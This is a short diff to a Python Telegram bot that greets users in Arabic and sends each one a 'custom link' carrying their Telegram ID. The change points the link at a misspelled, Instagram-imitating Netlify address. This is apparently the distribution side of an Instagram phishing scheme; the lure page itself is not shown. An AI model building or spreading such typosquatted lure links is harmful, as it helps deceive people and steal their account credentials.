@@ -7,7 +7,7 @@ bot = telebot.TeleBot(TOKEN)
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    custom_link = f"https://instagram-ginx-l9n.netlify.app/index.html?id={user_id}"
+    custom_link = f"https://instgram-account-ginxl9n.netlify.app/?id={user_id}"
     bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}")
 
 bot.infinity_polling()
